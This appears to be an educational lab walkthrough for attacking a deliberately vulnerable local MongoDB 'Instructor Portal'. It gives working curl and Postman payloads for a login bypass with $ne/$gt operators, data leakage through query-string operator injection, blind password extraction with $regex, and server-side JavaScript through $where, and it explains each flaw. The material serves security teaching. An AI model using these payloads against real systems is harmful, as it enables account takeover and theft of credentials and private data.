# NoSQL Injection Lab — Instructor Portal

This walkthrough shows you how to attack the **Instructor Portal** of the Course
Review Board and, step by step, *why* each attack works. You will:

1. Bypass the login without knowing any password.
2. Leak data the directory is supposed to hide.
3. Extract a hidden password one character at a time.
4. Run your own JavaScript on the database server.

> Primary tool: **Postman**. If you have `curl` installed, an equivalent command
> is given for every step — pick whichever you have.

The target endpoints live under `http://localhost:4000/api/instructors`.

---

## 0. Setup

1. Make sure **MongoDB** is running and `server/.env` has `MONGO_URI` and `JWT_SECRET`.
2. Seed the portal accounts:
   ```
   npm run seed:instructors --workspace server
   ```
3. Start the app (from the repo root):
   ```
   npm run dev
   ```

   API → `http://localhost:4000`, web app → `http://localhost:5175`.

### The accounts that exist

| Username       | Role                 | Notes                                 |
| -------------- | -------------------- | ------------------------------------- |
| `prof.smith` | instructor           | CS                                    |
| `prof.jones` | instructor           | Math                                  |
| `prof.lee`   | instructor           | Math                                  |
| `admin`      | **superadmin** | Holds a secret API key + private info |

You are **not** given the passwords or the API key. Your job is to get in and
extract them using injection.

> ### Postman quick start
>
> - Create a new request. Set the **method** and **URL** as each step says.
> - For `POST` requests: open the **Body** tab → choose **raw** → set the type
>   dropdown to **JSON**. Paste the JSON body shown in the step.
> - For `GET` requests with parameters: either type the full URL (including the
>   `?...` part) into the address bar, or use the **Params** tab and add each
>   key/value — Postman builds the query string for you.

---

## 1. Baseline — see the app behave honestly

Before attacking, observe normal behavior so the injected responses are an
obvious contrast.

**Honest login (wrong password → rejected):**

- Postman: `POST http://localhost:4000/api/instructors/login`, Body → raw → JSON:
  ```json
  { "username": "admin", "password": "wrong" }
  ```
- curl:
  ```bash
  curl -X POST http://localhost:4000/api/instructors/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}'
  ```

**Expected:** `401 { "message": "Invalid credentials" }`.

**Honest search:**

- Postman: `GET http://localhost:4000/api/instructors/search?name=Smith`
- curl:
  ```bash
  curl "http://localhost:4000/api/instructors/search?name=Smith"
  ```

Notice the honest login needs the real password, and search by a real name
returns matching records. Keep these responses in mind.

---

## 2. Attack 1 — Authentication bypass

The server builds its query like `findOne({ username, password })` using whatever
you send. If you send **objects** instead of **strings**, you send MongoDB query
*operators* instead of values.

- Postman: `POST http://localhost:4000/api/instructors/login`, Body → raw → JSON:
  ```json
  { "username": { "$ne": null }, "password": { "$ne": null } }
  ```
- curl:
  ```bash
  curl -X POST http://localhost:4000/api/instructors/login \
    -H "Content-Type: application/json" \
    -d '{"username":{"$ne":null},"password":{"$ne":null}}'
  ```

**Expected:** `200` with an instructor profile — you are logged in as the **first
matching account**, no password needed. The response even includes sensitive
fields (role, private email/phone, and for the admin, the API key).

**Variation** (same idea, "greater than empty string" always true):

```json
{ "username": { "$gt": "" }, "password": { "$gt": "" } }
```

**Why it works:** `{ "$ne": null }` means "not equal to null", which is true for
every stored value. The filter becomes "any username AND any password", so
`findOne` returns the first document. The code trusted that `username`/`password`
would be strings and never checked.

---

## 3. Attack 2 — Leak hidden data (operator injection)

The `/search` endpoint feeds the **entire query string** into `find(...)` and
returns **full documents**. The honest directory only shows name/department/role,
but search returns everything — if you can craft a filter that matches the juicy
accounts.

Target the superadmin by asking for anyone whose role is *not* a normal instructor:

- Postman: `GET http://localhost:4000/api/instructors/search?role[$ne]=instructor`
  (In the **Params** tab add key `role[$ne]` with value `instructor`.)
- curl:
  ```bash
  curl "http://localhost:4000/api/instructors/search?role[\$ne]=instructor"
  ```

**Expected:** the `admin` document, including `password`, `apiKey`,
`privateEmail`, and `privatePhone` — data the directory never exposes.

**Why it works:** Express turns `role[$ne]=instructor` into the object
`{ role: { $ne: "instructor" } }` and the code passes it straight to `find`.
There was no allow-list of which fields or operators a user may query, and no
`.select()` to strip secret fields from the response.

---

## 4. Attack 3 — Extract the password blindly (`$regex`)

You bypassed the login, but can you recover the admin's *actual* password? Use
the login response as a **true/false oracle** and `$regex` to test one character
at a time.

Start by testing the first character:

- Postman: `POST http://localhost:4000/api/instructors/login`, Body → raw → JSON:

  ```json
  { "username": "admin", "password": { "$regex": "^S" } }
  ```
- curl:

  ```bash
  curl -X POST http://localhost:4000/api/instructors/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":{"$regex":"^S"}}'
  ```
- **`200`** (login succeeds) → the password **starts with** `S`. Keep that
  character and extend the prefix.
- **`401`** → wrong guess; try another character.

Then grow the prefix one char at a time:

```json
{ "username": "admin", "password": { "$regex": "^Se" } }
```

```json
{ "username": "admin", "password": { "$regex": "^S3" } }
```

…and so on until you have recovered the whole password. Anchor the end with `$`
(e.g. `"^S3cr3t-Admin-Pw!$"`) to confirm you have the complete value.

> Tip: special regex characters in the password (like `!`, `.`, `-`) may need
> escaping (`\\!`) in your guesses. Letters and digits work as-is.

**Why it works:** `$regex` runs a pattern match against the stored value.
Because the password is stored in plaintext and the endpoint reveals whether a
match happened (200 vs 401), each guess leaks one bit of information — enough to
rebuild the secret character by character.

---

## 5. Attack 4 — Run JavaScript on the server (`$where`)

MongoDB's `$where` operator evaluates a JavaScript expression against each
document. Since `/search` passes your query straight through, you can inject it.

Find every account whose password is longer than 10 characters:

- Postman: `GET http://localhost:4000/api/instructors/search?$where=this.password.length>10`
  (In **Params**, key `$where`, value `this.password.length>10`.)
- curl:
  ```bash
  curl "http://localhost:4000/api/instructors/search?\$where=this.password.length>10"
  ```

**Expected (database that allows server-side JS):** only the documents for which
the server-evaluated JavaScript returned true.

Try another expression — accounts whose API key starts with `sk_live`:

```
?$where=this.apiKey && this.apiKey.indexOf('sk_live')===0
```

> ### ⚠️ `$where` depends on the database
>
> `$where` only runs if the database permits server-side JavaScript. A **local
> `mongod`** allows it by default, so these requests execute there. **MongoDB
> Atlas shared/free (M0/M2/M5) tiers block it** and reply with:
>
> ```json
> { "message": "$where not allowed in this atlas tier" }
> ```
>
> If you see that message, your injection still reached the query engine (the
> code passed `$where` through unchanged) — the engine simply refused to run it.
> To watch it actually execute, point `server/.env`'s `MONGO_URI` at a local
> MongoDB and re-seed. Attacks 1–3 do **not** depend on this and work on any tier.

**Why it works:** your string is handed to the database as code to execute per
document. `this` is the document. On an engine that runs it, this is remote code
execution *inside the database query engine* — one of the most dangerous
outcomes of unvalidated input.

---

## 6. Observe: the UI never does this

Open the Instructor Portal in the web app (`/portal`) and watch the requests in
your browser's Network tab. The real forms only ever send plain strings — the
vulnerability is reached by **tampering the request**, not by the app itself.
That is exactly how these bugs are exploited in the real world.
